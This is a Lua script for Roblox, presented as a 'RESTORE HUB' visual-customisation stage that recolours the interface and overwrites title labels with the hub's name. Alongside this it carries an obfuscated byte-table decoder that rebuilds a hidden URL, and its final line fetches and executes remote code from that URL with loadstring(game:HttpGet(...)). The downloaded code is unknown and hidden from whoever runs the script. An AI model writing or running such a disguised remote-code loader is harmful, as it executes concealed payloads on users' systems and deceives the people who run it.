
--[[ STAGE 2: VISUAL CORE ]]
local abK3vZswYEhnUbNRcg3Nkv = bit32 and bit32.bxor
if not abK3vZswYEhnUbNRcg3Nkv then
    abK3vZswYEhnUbNRcg3Nkv = function(a, b)
        local r, m = 0, 1
        while a > 0 or b > 0 do
            local aa = a % 2
            local bb = b % 2
            if aa ~= bb then r = r + m end
            a = (a - aa) / 2
            b = (b - bb) / 2
            m = m * 2
        end
        return r
    end
end
local function xZFOcVXiTQ4Y9F7Y(data, a, b, m, s, r, z)
    local out = {}
    for i = 1, #data do
        local v = data[i]
        local drift = (b + i * s + (z or 0)) % 256
        if m == 0 then
            v = (v - drift) % 256
            v = abK3vZswYEhnUbNRcg3Nkv(v, a)
        else
            v = abK3vZswYEhnUbNRcg3Nkv(v, a)
            v = (v - drift) % 256
        end
        out[i] = string.char(v)
    end
    local res = table.concat(out)
    if r then
        res = string.reverse(res)
    end
    return res
end
local pc5v3oX2KZksx4ELN = {
  {{207, 192, 218, 159, 156, 158, 140}, 218, 184, 1, 6, true, 11, 7},
  {{85, 27, 104, 6, 64, 79}, 85, 182, 1, 5, true, 2, 23},
  {{89, 126, 139, 125, 129}, 96, 60, 0, 1, true, 14, 13},
  {{212, 194, 211, 212, 169, 214, 166}, 109, 65, 1, 3, true, 8, 7},
  {{221, 231, 170, 175}, 98, 68, 1, 4, false, 7, 10},
  {{152, 131, 187, 195, 186, 202, 196}, 129, 158, 1, 7, false, 12, 21},
  {{40, 29, 41, 44}, 191, 74, 0, 1, true, 3, 6},
  {{55, 68, 255, 78, 64, 71}, 61, 231, 0, 2, false, 9, 0},
  {{88, 86, 64, 91, 90, 85}, 110, 167, 1, 5, false, 15, 21},
  {{246, 239, 235, 210, 232, 146}, 210, 159, 1, 5, true, 17, 31},
  {{223, 234, 21, 211, 224}, 202, 132, 1, 5, false, 6, 30},
  {{24, 217, 219, 224, 216, 222, 232}, 89, 143, 0, 2, true, 10, 17},
  {{101, 111, 192, 118, 123}, 176, 201, 0, 5, true, 16, 21},
  {{227, 219, 236, 242, 5}, 221, 9, 0, 7, true, 5, 27},
  {{129, 91, 120}, 152, 115, 0, 7, false, 13, 19},
  {{54, 15, 61, 39, 54, 47}, 147, 24, 1, 4, true, 4, 23},
  {{237, 10, 11, 8, 12, 68}, 200, 69, 0, 1, false, 1, 7}
}
local NHwCpEDNVRMKb = {}
for QyWGnRJ2NQgclFpoOpEYNF = 1, #pc5v3oX2KZksx4ELN do
    local KMlw52um8NPS0tk = pc5v3oX2KZksx4ELN[QyWGnRJ2NQgclFpoOpEYNF]
    NHwCpEDNVRMKb[KMlw52um8NPS0tk[7]] = xZFOcVXiTQ4Y9F7Y(
        KMlw52um8NPS0tk[1],
        KMlw52um8NPS0tk[2],
        KMlw52um8NPS0tk[3],
        KMlw52um8NPS0tk[4],
        KMlw52um8NPS0tk[5],
        KMlw52um8NPS0tk[6],
        KMlw52um8NPS0tk[8]
    )
end
local hohxjqOivFDokP4YtL = table.concat(NHwCpEDNVRMKb)
local HubName = "RESTORE HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(hohxjqOivFDokP4YtL))()
